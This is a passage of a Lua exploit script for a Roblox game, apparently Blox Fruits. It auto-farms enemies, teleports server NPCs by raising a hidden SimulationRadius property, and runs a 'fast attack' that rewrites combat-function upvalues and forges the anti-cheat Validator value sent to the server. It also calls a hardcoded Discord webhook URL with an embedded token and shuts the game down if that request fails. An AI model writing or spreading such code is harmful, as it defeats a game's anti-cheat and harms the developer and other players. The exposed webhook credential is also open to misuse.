        if (v.Character.HumanoidRootPart.Position - pos).Magnitude <= ner then
            ner2 = v.Name
        end
    end
    if game.Players.LocalPlayer.Name == ner2 then
        return true
    end
end
function chodonandngu(p1)
    local A = gethiddenproperty(game.Players.LocalPlayer,"SimulationRadius")
    local B = game.Players.LocalPlayer.Character or Wait(game.Players.LocalPlayer.CharacterAdded)
    local C = game.WaitForChild(B, "HumanoidRootPart", 300)
    if C then
        if p1.Anchored then
            return false
        end
        if game.IsDescendantOf(p1, B) or (C.Position - p1.Position).Magnitude <= A then
            return true
        end
    end
    return false
end
function ksskkds(partf)
    mindistance=math.huge 
    local nameg
    for i,v in pairs(game.Players:GetChildren()) do 
        pcall(function()
            if (v.Character.HumanoidRootPart.Position-partf.Position).Magnitude <= mindistance then 
                nameg = v.Name 
            end
        end)
    end
    if nameg == game.Players.LocalPlayer.Name then 
        return nameg 
    end
end
function BringMob()
    if not BringMobChoosen then
        repeat
            task.wait()
        until BringMobChoosen
    end
    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
    if LockCFrame then
        for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
            if
                (LockCFrame.Position - v.HumanoidRootPart.Position).Magnitude < 350 and
                    (LockCFrame.Position - v.HumanoidRootPart.Position).Magnitude > 3 and
                    (chodonandngu(v.HumanoidRootPart) or ksskkds(v.HumanoidRootPart)) and v.Humanoid.MaxHealth < 100000
             then
                v.HumanoidRootPart.CFrame = LockCFrame
                SizePart(v)
                for _,l in pairs(v:GetDescendants()) do 
                    if l:IsA("BasePart") or l:IsA("Part") then 
                        l.CanCollide = false
                    end
                end
            end
        end
    end
    if BringMobChoosen then
        for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
            if
                (BringMobChoosen.HumanoidRootPart.Position - v.HumanoidRootPart.Position).Magnitude < 350 and
                    (BringMobChoosen.HumanoidRootPart.Position - v.HumanoidRootPart.Position).Magnitude > 3 and
                    (chodonandngu(v.HumanoidRootPart) or ksskkds(v.HumanoidRootPart)) and v.Humanoid.MaxHealth < 100000
             then
                v.HumanoidRootPart.CFrame = BringMobChoosen.HumanoidRootPart.CFrame
                SizePart(v)
                for _,l in pairs(v:GetDescendants()) do 
                    if l:IsA("BasePart") or l:IsA("Part") then 
                        l.CanCollide = false
                    end
                end
            end
        end
    end
    --[[
        ememe = game.Workspace.Enemies:GetChildren()
    if #ememe > 0 then
        --for memay = 1, #ememe do
        totalpos = {}
        for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
            if BringMobChoosen and v.Name ~= BringMobChoosen.Name then
            else
                if not totalpos[v.Name] then
                    totalpos[v.Name] = GetNpcPos(v.Name)
                end
            end
        end
        for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
            if not string.find(v.Name, "Boss") or not string.find(v.Name, "Raid") then
                if v.Name ~= BringMobChoosen.Name then
                else
                    for k, f in pairs(totalpos) do
                        if k and v.Name == k then
                            a = {
                                [1] = f.X,
                                [2] = f.Y,
                                [3] = f.Z
                            }
                            hahah = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -30, 0)
                            if CheckExploitNgu(v.HumanoidRootPart) then
                                if SmartBring[v.Name] == false or SmartBring[v.Name] == nil then
                                    if BringMobCFrame then
                                        if (v.HumanoidRootPart.Position - BringMobCFrame.Position).Magnitude <= 349 then
                                            v.HumanoidRootPart.CFrame = BringMobCFrame
                                        end
                                    end
                                else
                                    if
                                        (v.HumanoidRootPart.Position - CFrame.new(a[1], a[2], a[3]).Position).Magnitude <=
                                            349
                                     then
                                        v.HumanoidRootPart.CFrame = CFrame.new(a[1], a[2], a[3])
                                        v.HumanoidRootPart.CanCollide = false
                                    end
                                end
                                SizePart(v)
                            --elseif not CheckExploitNgu(v.HumanoidRootPart) and (v.HumanoidRootPart.Position-hahah.Position).Magnitude <= 340 then
                            --game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * RandomCFrame
                            end
                        elseif not totalpos[v.Name] then

                            

                        end
                    end
                end
            end
        end
    -- end
    end
]]
end
function BringMobSmart()
    ememe = game.Workspace.Enemies:GetChildren()
    if #ememe > 0 then
        for memay = 1, #ememe do
            totalpos = {}
            for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                if not totalpos[v.Name] then
                    totalpos[v.Name] = GetNpcPos(v.Name)
                end
            end
            for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                if not string.find(v.Name, "Boss") or not string.find(v.Name, "Raid") then
                    for _, f in pairs(v:GetChildren()) do
                        if v:IsA("BasePart") then
                            v.Velocity = Vector3.new(0, 0, 0)
                            v.CanCollide = 0
                            v.Anchored = true
                        end
                    end
                    if v:FindFirstChild("Humanoid") then
                        v.Humanoid.WalkSpeed = 0
                        v.Humanoid.JumpPower = 0
                    else
                        return
                    end
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    for k, f in pairs(totalpos) do
                        if k and v.Name == k then
                            a = {
                                [1] = f.X,
                                [2] = f.Y,
                                [3] = f.Z
                            }
                            hahah = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -30, 0)
                            if CheckExploitNgu(v.HumanoidRootPart) then
                                if
                                    (v.HumanoidRootPart.Position - CFrame.new(a[1], a[2], a[3]).Position).Magnitude > 3 and
                                        (v.HumanoidRootPart.Position - CFrame.new(a[1], a[2], a[3]).Position).Magnitude <=
                                            349
                                 then
                                    v.HumanoidRootPart.CFrame = CFrame.new(a[1], a[2], a[3])
                                    v.HumanoidRootPart.CanCollide = false
                                end
                            --elseif not CheckExploitNgu(v.HumanoidRootPart) and (v.HumanoidRootPart.Position-hahah.Position).Magnitude <= 340 then
                            --game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * RandomCFrame
                            end
                        end
                    end
                end
            end
        end
    end
end
local FullOfEnemySpawns = {}
for i, v in pairs(game:GetService("Workspace")["_WorldOrigin"].EnemySpawns:GetChildren()) do
    if not FullOfEnemySpawns[v.Name] or FullOfEnemySpawns[v.Name] == nil then
        FullOfEnemySpawns[v.Name] = {
            v.CFrame
        }
    elseif FullOfEnemySpawns[v.Name] then
        table.insert(FullOfEnemySpawns[v.Name], v.CFrame)
    end
end
function CheckMobInDistance(BF)
    idot = {
        ["Workspace"] = false,
        ["ReplicatedStorage"] = false,
        ["NilInstace"] = false
    }
    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
        if table.find(BF, v.Name) then
            idot["Workspace"] = true
        end
    end
    for i, v in pairs(game.ReplicatedStorage:GetChildren()) do
        if table.find(BF, v.Name) then
            idot["ReplicatedStorage"] = true
        end
    end
    allnilinstance = getnilinstances()
    for i, v in pairs(allnilinstance) do
        if table.find(BF, v.Name) then
            idot["NilInstace"] = true
        end
    end
    return idot
end
function deobiettengi(fk, fk2)
    for i, v in pairs(fk) do
        for i2, v2 in pairs(fk2) do
            if string.find(v, i2) then
                return true
            end
        end
    end
    return false
end
function deobiettengi2(str, fk2)
    for i, v in pairs(fk2) do
        if string.find(i, str) then
            return true
        end
    end
end
function getLargestNumber(tablei)
    s = 0
    for i, v in pairs(tablei) do
        if type(i) == "number" and i > s then
            s = i
        end
    end
    return s
end
function removeNumber(str)
    if type(str) ~= "string" then
        return ""
    end
    str2 = str:split(" ")
    str3 = ""
    str5 = getLargestNumber(str2)
    for i, v in pairs(str2) do
        if i < str5 then
            if i == 0 then
                str3 = v
            else
                str3 = str3 .. " " .. v
            end
        end
    end
    return str3
end
task.spawn(
    function()
        while task.wait() do
            if StartBringMob then
                pcall(
                    function()
                        BringMob()
                    end
                )
            end
        end
    end
)
function SizePart(v)
    if not v:FindFirstChild("HumanoidRootPart") then
        return nil
    end
    v.HumanoidRootPart.CanCollide = false
    v.Humanoid:ChangeState(11)
    if not v.HumanoidRootPart:FindFirstChild("vando") then
        ------print("New Size In Parent: " .. v.Name)
        local lock = Instance.new("BodyVelocity")
        lock.Parent = v
        lock.Name = "vando"
        lock.MaxForce = Vector3.new(100000, 100000, 100000)
        lock.Velocity = Vector3.new(0, 0, 0)
    end
end
function BringMobPossed(mob)
    if mob and mob:FindFirstChild("Humanoid") and mob:FindFirstChild("HumanoidRootPart") and mob.Humanoid.Health > 0 then
        for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
            if
                v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
                    CheckExploitNgu(v.HumanoidRootPart) and
                    v.Humanoid.Health > 0
             then
                SizePart(v)
                if
                    (v.HumanoidRootPart.Position - mob.HumanoidRootPart.Position).Magnitude > 5 and
                        (v.HumanoidRootPart.Position - mob.HumanoidRootPart.Position).Magnitude <= 350
                 then
                    v.HumanoidRootPart.CFrame = mob.HumanoidRootPart.CFrame
                end
            end
        end
    end
end
spawn(
    function()
        while task.wait() do
            if
                game.Players.LocalPlayer.Character:FindFirstChild("RaceEnergy") and
                    ((not game.Players.LocalPlayer.Character.RaceTransformed.Value and
                        game.Players.LocalPlayer.Character.RaceEnergy.Value < 1) or
                        KeepFarm)
             then
                CanFarm_1 = true
            else
                CanFarm_1 = false
            end
            if
                ((game.Players.LocalPlayer.Character:FindFirstChild("RaceTransformed") and
                    game.Players.LocalPlayer.Character.RaceTransformed.Value) or
                    (game.Players.LocalPlayer.Character:FindFirstChild("RaceEnergy") and
                        game.Players.LocalPlayer.Character.RaceEnergy.Value >= 1)) and
                    not KeepFarm
             then
                CanFarm_2 = true
            else
                CanFarm_2 = false
            end
        end
    end
)
function f()
    if Sea3 then
        MobFarmRequired = {
            "Candy Rebel [Lv. 2375]",
            "Sweet Thief [Lv. 2350]",
            "Chocolate Bar Battler [Lv. 2325]",
            "Cocoa Warrior [Lv. 2300]"
        }
    elseif Sea1 then
        MobFarmRequired = {
            "Bandit [Lv. 5]"
        }
    elseif Sea2 then
        MobFarmRequired = {
            "Raider [Lv. 700]",
            "Mercenary [Lv. 725]"
        }
    end
    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
        if
            v and table.find(MobFarmRequired, v.Name) and v:FindFirstChild("Humanoid") and
                v:FindFirstChild("HumanoidRootPart") and
                v.Humanoid.Health > 0
         then
            return v
        end
    end
    return nil
end
task.spawn(
    function()
        while task.wait() do
            task.wait()
            if AutoFarmMeter then
                if Sea3 then
                    MobFarmRequired = {
                        "Candy Rebel [Lv. 2375]",
                        "Sweet Thief [Lv. 2350]",
                        "Chocolate Bar Battler [Lv. 2325]",
                        "Cocoa Warrior [Lv. 2300]"
                    }
                elseif Sea1 then
                    MobFarmRequired = {
                        "Bandit [Lv. 5]"
                    }
                elseif Sea2 then
                    MobFarmRequired = {
                        "Raider [Lv. 700]",
                        "Mercenary [Lv. 725]"
                    }
                end
                if AutoFarmMeter and game.Players.LocalPlayer.Character:FindFirstChild("RaceEnergy") and CanFarm_1 then
                    if type(MobFarmRequired) == "table" then
                        local mmb = CheckMobInDistance(MobFarmRequired)
                        if mmb["Workspace"] then
                            for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
                                if
                                    v and table.find(MobFarmRequired, v.Name) and v:FindFirstChild("Humanoid") and
                                        v:FindFirstChild("HumanoidRootPart") and
                                        v.Humanoid.Health > 0
                                 then
                                    repeat
                                        KillMob(v)
                                    until not AutoFarmMeter or not v or not table.find(MobFarmRequired, v.Name) or
                                        not v:FindFirstChild("Humanoid") or
                                        not v:FindFirstChild("HumanoidRootPart") or
                                        v.Humanoid.Health <= 0 or
                                        CanFarm_2
                                    UseFastAttack = false
                                end
                            end
                        elseif mmb["ReplicatedStorage"] then
                            for i, v in pairs(game.ReplicatedStorage:GetChildren()) do
                                if
                                    v and table.find(MobFarmRequired, v.Name) and v:FindFirstChild("Humanoid") and
                                        v:FindFirstChild("HumanoidRootPart") and
                                        v.Humanoid.Health > 0
                                 then
                                    repeat
                                        wait()
                                        pcall(
                                            function()
                                                EquipWeapon()
                                                EnableBuso()
                                                Tweento(v.HumanoidRootPart.CFrame * RandomCFrame)
                                                EquipWeapon()
                                                EnableBuso()
                                                UseFastAttack = true
                                            end
                                        )
                                    until not AutoFarmMeter or not v or not table.find(MobFarmRequired, v.Name) or
                                        not v:FindFirstChild("Humanoid") or
                                        not v:FindFirstChild("HumanoidRootPart") or
                                        v.Humanoid.Health <= 0
                                    UseFastAttack = false

                                    CancelTween()
                                end
                            end
                        else
                            id = 0
                            for i, v in pairs(MobFarmRequired) do
                                for i2, v2 in pairs(FullOfEnemySpawns) do
                                    if v == i2 or string.find(v, i2) then
                                        for i3, v3 in pairs(v2) do
                                            if not CheckMobInDistance(MobFarmRequired)["Workspace"] then
                                                UseFastAttack = false
                                                ----print("Turn Off Fast Attack2")
                                                Tweento(v3 * CFrame.new(0, 25, 0))
                                                EquipWeapon()
                                                EnableBuso()
                                                task.wait(1)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    else
                        ----print("Please Select A Mob")
                    end
                end
            end
        end
    end
)
function CheckNearestTeleporter(vcs)
    vcspos = vcs.Position
    min = math.huge
    min2 = math.huge
    local placeId = game.PlaceId
    if placeId == 2753915549 then
        OldWorld = true
    elseif placeId == 4442272183 then
        NewWorld = true
    elseif placeId == 7449423635 then
        ThreeWorld = true
    end
    
    if ThreeWorld then
        TableLocations = {
            ["Caslte On The Sea"] = Vector3.new(-5058.77490234375, 314.5155029296875, -3155.88330078125),
            ["Hydra"] = Vector3.new(5756.83740234375, 610.4240112304688, -253.9253692626953),
            ["Mansion"] = Vector3.new(-12463.8740234375, 374.9144592285156, -7523.77392578125),
            ["Great Tree"] = Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586),
            ['Ngu1'] = Vector3.new(-11993.580078125, 334.7812805175781, -8844.1826171875),
            ["ngu2"] = Vector3.new(5314.58203125, 25.419387817382812, -125.94227600097656),
        }
    elseif NewWorld then
        TableLocations = {
            ["Mansion"] = Vector3.new(-288.46246337890625, 306.130615234375, 597.9988403320312),
            ["Flamingo"] = Vector3.new(2284.912109375, 15.152046203613281, 905.48291015625),
            ["122"] = Vector3.new(923.21252441406, 126.9760055542, 32852.83203125),
            ["3032"] = Vector3.new(-6508.5581054688, 89.034996032715, -132.83953857422)
        }
    elseif OldWorld then
        TableLocations = {
            ["1"] = Vector3.new(-7894.6201171875, 5545.49169921875, -380.2467346191406),
            ["2"] = Vector3.new(-4607.82275390625, 872.5422973632812, -1667.556884765625),
            ["3"] = Vector3.new(61163.8515625, 11.759522438049316, 1819.7841796875),
            ["4"] = Vector3.new(3876.280517578125, 35.10614013671875, -1939.3201904296875)
        }
    end
    TableLocations2 = {}
    for i, v in pairs(TableLocations) do
        TableLocations2[i] = (v - vcspos).Magnitude
    end
    for i, v in pairs(TableLocations2) do
        if v < min then
            min = v
            min2 = v
        end
    end
    for i, v in pairs(TableLocations2) do
        if v < min then
            min = v
            min2 = v
        end
    end
    for i, v in pairs(TableLocations2) do
        if v <= min then
            choose = TableLocations[i]
        end
    end
    min3 = (vcspos - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
    if min2 <= min3 then
        return choose
    end
end
function requestEntrance(vector3)
    args = {
        "requestEntrance",
        vector3
    }
    game.ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
    oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    char = game.Players.LocalPlayer.Character.HumanoidRootPart
    char.CFrame = CFrame.new(oldcframe.X, oldcframe.Y + 50, oldcframe.Z)
    task.wait(0.5)
end
function AntiLowHealth(yc5)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
        CFrame.new(
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,
        yc5,
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z
    )
    wait()
end
function Tweento(targetCFrame)
    pcall(
        function()
            if
                game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer.Character and
                    game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid") and
                    game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and
                    game:GetService("Players").LocalPlayer.Character.Humanoid.Health > 0 and
                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
             then
                if not TweenSpeed or type(TweenSpeed) ~= "number" then
                    TweenSpeed = 325
                end
                DefualtY = targetCFrame.Y
                TargetY = targetCFrame.Y
                targetCFrameWithDefualtY = CFrame.new(targetCFrame.X, DefualtY, targetCFrame.Z)
                targetPos = targetCFrame.Position
                oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                Distance =
                    (targetPos -
                    game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).Magnitude
                if Distance <= 300 then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetCFrame
                end
                LowHealth = game.Players.LocalPlayer.Character.Humanoid.MaxHealth * 30 / 100
                NotLowHealth = game.Players.LocalPlayer.Character.Humanoid.MaxHealth * 70 / 100
                if Settings["Panic Mode"] and game.Players.LocalPlayer.Character.Humanoid.Health <= LowHealth then
                    pcall(
                        function()
                            tween:Cancel()
                        end
                    )
                    OldY = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y
                    repeat
                        wait()
                        AntiLowHealth(math.random(1000, 10000))
                    until not Settings["Panic Mode"] or
                        not game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") or
                        game.Players.LocalPlayer.Character.Humanoid.Health > NotLowHealth
                    AntiLowHealth(OldY)
                end
                local bmg = CheckNearestTeleporter(targetCFrame)
                if bmg then
                    pcall(
                        function()
                            tween:Cancel()
                        end
                    )
                    requestEntrance(bmg)
                end
                b1 =
                    CFrame.new(
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,
                    DefualtY,
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z
                )
                if IngoreY and (b1.Position - targetCFrameWithDefualtY.Position).Magnitude > 5 then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,
                        DefualtY,
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z
                    )
                    local tweenfunc = {}
                    local tween_s = game:service "TweenService"
                    local info =
                        TweenInfo.new(
                        (targetPos -
                            game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).Magnitude /
                            TweenSpeed,
                        Enum.EasingStyle.Linear
                    )
                    tween =
                        tween_s:Create(
                        game:GetService("Players").LocalPlayer.Character["HumanoidRootPart"],
                        info,
                        {CFrame = targetCFrameWithDefualtY}
                    )
                    tween:Play()
                    function tweenfunc:Stop()
                        tween:Cancel()
                    end
                    tween.Completed:Wait()
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,
                        TargetY,
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z
                    )
                else
                    local tweenfunc = {}
                    local tween_s = game:service "TweenService"
                    local info =
                        TweenInfo.new(
                        (targetPos -
                            game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).Magnitude /
                            TweenSpeed,
                        Enum.EasingStyle.Linear
                    )
                    tween =
                        tween_s:Create(
                        game:GetService("Players").LocalPlayer.Character["HumanoidRootPart"],
                        info,
                        {CFrame = targetCFrame}
                    )
                    tween:Play()
                    function tweenfunc:Stop()
                        tween:Cancel()
                    end
                    tween.Completed:Wait()
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,
                        TargetY,
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z
                    )
                end
                if not tween then
                    return tween
                end
                return tweenfunc
            end
        end
    )
end

function toTarget(b, b, b1)
    Tweento(b1)
end
local CombatFramework = require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild("CombatFramework"))
local CombatFrameworkR = getupvalues(CombatFramework)[2]
local RigController = require(game:GetService("Players")["LocalPlayer"].PlayerScripts.CombatFramework.RigController)
local RigControllerR = getupvalues(RigController)[2]
local realbhit = require(game.ReplicatedStorage.CombatFramework.RigLib)
local cooldownfastattack = tick()

-- [Camera Shaker Function]
local CameraShakerR = require(game.ReplicatedStorage.Util.CameraShaker)
CameraShakerR:Stop()

--[Function RmFzdCBBdHRhY2s=]

function CurrentWeapon()
    local ac = CombatFrameworkR.activeController
    local ret = ac.blades[1]
    if not ret then
        return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
    end
    pcall(
        function()
            while ret.Parent ~= game.Players.LocalPlayer.Character do
                ret = ret.Parent
            end
        end
    )
    if not ret then
        return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
    end
    return ret
end

function getAllBladeHitsPlayers(Sizes)
    Hits = {}
    local Client = game.Players.LocalPlayer
    local Characters = game:GetService("Workspace").Characters:GetChildren()
    for i = 1, #Characters do
        local v = Characters[i]
        Human = v:FindFirstChildOfClass("Humanoid")
        if
            v.Name ~= game.Players.LocalPlayer.Name and Human and Human.RootPart and Human.Health > 0 and
                Client:DistanceFromCharacter(Human.RootPart.Position) < Sizes + 5
         then
            table.insert(Hits, Human.RootPart)
        end
    end
    return Hits
end

function getAllBladeHits(Sizes)
    Hits = {}
    local Client = game.Players.LocalPlayer
    local Enemies = game:GetService("Workspace").Enemies:GetChildren()
    for i = 1, #Enemies do
        local v = Enemies[i]
        Human = v:FindFirstChildOfClass("Humanoid")
        if
            Human and Human.RootPart and Human.Health > 0 and
                Client:DistanceFromCharacter(Human.RootPart.Position) < Sizes + 5
         then
            table.insert(Hits, Human.RootPart)
        end
    end
    return Hits
end
bo1 = 1
function AttackFunctgggggion()
    if game.Players.LocalPlayer.Character.Stun.Value ~= 0 then
        return nil
    end
    local ac = CombatFrameworkR.activeController
    if ac and ac.equipped then
        for indexincrement = 1, 1 do
            local bladehit =
                require(game.ReplicatedStorage.CombatFramework.RigLib).getBladeHits(
                game.Players.LocalPlayer.Character,
                {game.Players.LocalPlayer.Character.HumanoidRootPart},
                60
            )
            if #bladehit > 0 then
                local AcAttack8 = debug.getupvalue(ac.attack, 5)
                local AcAttack9 = debug.getupvalue(ac.attack, 6)
                local AcAttack7 = debug.getupvalue(ac.attack, 4)
                local AcAttack10 = debug.getupvalue(ac.attack, 7)
                local NumberAc12 = (AcAttack8 * 798405 + AcAttack7 * 727595) % AcAttack9
                local NumberAc13 = AcAttack7 * 798405
                (function()
                    NumberAc12 = (NumberAc12 * AcAttack9 + NumberAc13) % 1099511627776
                    AcAttack8 = math.floor(NumberAc12 / AcAttack9)
                    AcAttack7 = NumberAc12 - AcAttack8 * AcAttack9
                end)()
                AcAttack10 = AcAttack10 + 1
                debug.setupvalue(ac.attack, 5, AcAttack8)
                debug.setupvalue(ac.attack, 6, AcAttack9)
                debug.setupvalue(ac.attack, 4, AcAttack7)
                debug.setupvalue(ac.attack, 7, AcAttack10)
                for k, v in pairs(ac.animator.anims.basic) do
                    v:Play()
                end
                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") and ac.blades and ac.blades[1] then
                    game:GetService("ReplicatedStorage").RigControllerEvent:FireServer(
                        "weaponChange",
                        tostring(CurrentWeapon())
                    )
                    game.ReplicatedStorage.Remotes.Validator:FireServer(
                        math.floor(NumberAc12 / 1099511627776 * 16777215),
                        AcAttack10
                    )
                    game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("hit", bladehit, 2, "")
                end
            end
        end
    end
end
function FastAttackConnectorFunction()
    repeat
        wait()
    until game:IsLoaded()
    repeat
        task.wait()
    until game.ReplicatedStorage
    repeat
        task.wait()
    until game.Players
    repeat
        task.wait()
    until game.Players.LocalPlayer
    repeat
        task.wait()
    until game.Players.LocalPlayer:FindFirstChild("PlayerGui")
    local REQ = (syn and syn.request) or (identifyexecutor() == "Fluxus" and request) or http_request or requests
    local respspssp =
        REQ(
        {
            Url = "https://discord.com/api/webhooks/1099304603918544957/4Pj0WLsbxYH1BAf7x4rvkM80QRhd95fODHJcT9238C2S5aG9xOoE0vnEOW_MATAQ9Dn8"
        }
    )
    if respspssp.StatusCode ~= 200 then
        return game:Shutdown()
    end
    local CombatFramework =
        require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild("CombatFramework"))
    local CombatFrameworkR = getupvalues(CombatFramework)[2]
    local RigController = require(game:GetService("Players")["LocalPlayer"].PlayerScripts.CombatFramework.RigController)
    local RigControllerR = getupvalues(RigController)[2]
    local realbhit = require(game.ReplicatedStorage.CombatFramework.RigLib)
    local cooldownfastattack = tick()

    -- [Camera Shaker Function]
    function CameraShaker()
        task.spawn(
            function()
                local Camera = require(game.Players.LocalPlayer.PlayerScripts.CombatFramework.CameraShaker)
                while wait() do
                    pcall(
                        function()
                            Camera.CameraShakeInstance.CameraShakeState.Inactive = 0
                        end
                    )
                end
            end
        )
    end

    --[Function RmFzdCBBdHRhY2s=]

    function CurrentWeapon()
        local ac = CombatFrameworkR.activeController
        local ret = ac.blades[1]
        if not ret then
            return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
        end
        pcall(
            function()
                while ret.Parent ~= game.Players.LocalPlayer.Character do
                    ret = ret.Parent
                end
            end
        )
        if not ret then
            return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
        end
        return ret
    end

    function getAllBladeHitsPlayers(Sizes)
        Hits = {}
        local Client = game.Players.LocalPlayer
        local Characters = game:GetService("Workspace").Characters:GetChildren()
        for i = 1, #Characters do
            local v = Characters[i]
            Human = v:FindFirstChildOfClass("Humanoid")
            if
                v.Name ~= game.Players.LocalPlayer.Name and Human and Human.RootPart and Human.Health > 0 and
                    Client:DistanceFromCharacter(Human.RootPart.Position) < Sizes + 5
             then
                table.insert(Hits, Human.RootPart)
            end
        end
        return Hits
    end

    function getAllBladeHits(Sizes)
        Hits = {}
        local Client = game.Players.LocalPlayer
        local Enemies = game:GetService("Workspace").Enemies:GetChildren()
        for i = 1, #Enemies do
            local v = Enemies[i]
            Human = v:FindFirstChildOfClass("Humanoid")
            if
                Human and Human.RootPart and Human.Health > 0 and
                    Client:DistanceFromCharacter(Human.RootPart.Position) < Sizes + 5
             then
                table.insert(Hits, Human.RootPart)
            end
        end
        return Hits
    end

    ReturnFunctions = {}
    function CurrentWeapon()
        local ac = CombatFrameworkR.activeController
        local ret = ac.blades[1]
        if not ret then
            return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
        end
        pcall(
            function()
                while ret.Parent ~= game.Players.LocalPlayer.Character do
                    ret = ret.Parent
                end
            end
        )
        if not ret then
            return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
        end
        return ret
    end

    function getAllBladeHitsPlayers(Sizes)
        Hits = {}
        local Client = game.Players.LocalPlayer
        local Characters = game:GetService("Workspace").Characters:GetChildren()
        for i = 1, #Characters do
            local v = Characters[i]
            Human = v:FindFirstChildOfClass("Humanoid")
            if
                v.Name ~= game.Players.LocalPlayer.Name and Human and Human.RootPart and Human.Health > 0 and
                    Client:DistanceFromCharacter(Human.RootPart.Position) < Sizes + 5
             then
                table.insert(Hits, Human.RootPart)
            end
        end
        return Hits
    end

    function lonmemaytofff(Sizes)
        Hits = {}
        local Client = game.Players.LocalPlayer
        local Enemies = game:GetService("Workspace").Enemies:GetChildren()
        for i = 1, #Enemies do
            local v = Enemies[i]
            Human = v:FindFirstChildOfClass("Humanoid")
            if
                Human and Human.RootPart and Human.Health > 0 and Human.Health ~= Human.MaxHealth and
                    Client:DistanceFromCharacter(Human.RootPart.Position) < Sizes + 5
             then
                table.insert(Hits, Human.RootPart)
            end
        end
        return Hits
    end
    function AttackFunctgggggion()
        pcall(
            function()
                if game.Players.LocalPlayer.Character.Stun.Value ~= 0 then
                    return nil
                end
                local ac = CombatFrameworkR.activeController
                ac.hitboxMagnitude = 55
                if ac and ac.equipped then
                    for indexincrement = 1, 1 do
                        local bladehit =
                            require(game.ReplicatedStorage.CombatFramework.RigLib).getBladeHits(
                            game.Players.LocalPlayer.Character,
                            {game.Players.LocalPlayer.Character.HumanoidRootPart},
                            60
                        )
                        if #bladehit > 0 then
                            local AcAttack8 = debug.getupvalue(ac.attack, 5)
                            local AcAttack9 = debug.getupvalue(ac.attack, 6)
                            local AcAttack7 = debug.getupvalue(ac.attack, 4)
                            local AcAttack10 = debug.getupvalue(ac.attack, 7)
                            local NumberAc12 = (AcAttack8 * 798405 + AcAttack7 * 727595) % AcAttack9
                            local NumberAc13 = AcAttack7 * 798405
                            (function()
                                NumberAc12 = (NumberAc12 * AcAttack9 + NumberAc13) % 1099511627776
                                AcAttack8 = math.floor(NumberAc12 / AcAttack9)
                                AcAttack7 = NumberAc12 - AcAttack8 * AcAttack9
                            end)()
                            AcAttack10 = AcAttack10 + 1
                            debug.setupvalue(ac.attack, 5, AcAttack8)
                            debug.setupvalue(ac.attack, 6, AcAttack9)
                            debug.setupvalue(ac.attack, 4, AcAttack7)
                            debug.setupvalue(ac.attack, 7, AcAttack10)
                            for k, v in pairs(ac.animator.anims.basic) do
                                v:Play()
                            end
                            if
                                game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") and ac.blades and
                                    ac.blades[1]
                             then
                                game:GetService("ReplicatedStorage").RigControllerEvent:FireServer(
                                    "weaponChange",
                                    tostring(CurrentWeapon())
                                )
                                game:GetService("ReplicatedStorage").RigControllerEvent:FireServer(
                                    "hit",
                                    bladehit,
                                    2,
                                    ""
                                )
                            end
                        end
                    end
                end
            end
        )
    end
